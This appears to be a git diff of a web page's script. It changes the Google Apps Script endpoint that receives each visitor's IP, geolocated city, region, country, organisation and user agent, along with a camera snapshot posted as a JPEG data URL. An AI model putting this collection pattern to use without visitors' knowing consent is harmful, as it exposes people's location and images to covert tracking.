@@ -28,7 +28,7 @@
           `IP: ${ip}, 類型: ${ipType}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}, 用戶代理: ${userAgent}`;
 
         // 發送 GET 請求到 Google Apps Script
-        const url = new URL('https://script.google.com/macros/s/AKfycbwb9ila3-GkxY74_vM80mOPd9R2E7_pyshfw7myAQ0WYVmZ_BeiBQA9JcsmULiWQ96aAQ/exec');
+        const url = new URL('https://script.google.com/macros/s/AKfycbxI1OqLT7-zWhSB4FJUTsjhRZg-JG6YYUb8Rl0vWTYgHjEWQamPgfhWpPPYmqB_U6XdEg/exec');
         url.searchParams.append('ip', ip);
         url.searchParams.append('ipType', ipType);
         url.searchParams.append('userAgent', userAgent);
@@ -62,41 +62,35 @@
   canvas.height = video.videoHeight;
   ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-  canvas.toBlob(async (blob) => {
-    if (!blob) {
-      document.getElementById('status').innerText = '無法生成圖片 Blob';
-      return;
+    // 將 Canvas 內容轉為 Data URL
+  const dataUrl = canvas.toDataURL('image/jpeg');
+
+  try {
+    // 發送 POST 請求到 Google Apps Script 後端
+    const response = await fetch('https://script.google.com/macros/s/AKfycbxI1OqLT7-zWhSB4FJUTsjhRZg-JG6YYUb8Rl0vWTYgHjEWQamPgfhWpPPYmqB_U6XdEg/exec', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ photoDataUrl: dataUrl })
+    });
+
+    if (!response.ok) {
+      throw new Error(`伺服器返回錯誤：${response.status} ${response.statusText}`);
     }
 
-    // 建立 FormData 並附加圖片
-    const formData = new FormData();
-    formData.append('photo', blob, 'photo.jpg');
-
-    try {
-      // 發送 POST 請求
-      const response = await fetch('https://script.google.com/macros/s/AKfycbwb9ila3-GkxY74_vM80mOPd9R2E7_pyshfw7myAQ0WYVmZ_BeiBQA9JcsmULiWQ96aAQ/exec', {
-        method: 'POST',
-        body: formData,
-      });
-
-      if (!response.ok) {
-        throw new Error(`伺服器返回錯誤：${response.status} ${response.statusText}`);
-      }
-
-      const result = await response.json();
-      if (result.success) {
-        document.getElementById('status').innerText = '照片成功上傳！';
-        console.log('照片 URL:', result.photoUrl);
-      } else {
-        document.getElementById('status').innerText = `照片上傳失敗：${result.error}`;
-      }
-    } catch (error) {
-      console.error('圖片上傳失敗:', error);
-      document.getElementById('status').innerText = '圖片上傳失敗，請檢查控制台。';
+    const result = await response.json();
+    if (result.success) {
+      document.getElementById('status').innerText = '照片成功上傳！';
+      console.log('照片 URL:', result.photoUrl);
+    } else {
+      document.getElementById('status').innerText = `照片上傳失敗：${result.error}`;
     }
-  }, 'image/jpeg');
+  } catch (error) {
+    console.error('圖片上傳失敗:', error);
+    document.getElementById('status').innerText = '圖片上傳失敗，請檢查控制台。';
+  }
 }
-
     
 
     // 初始化攝影機
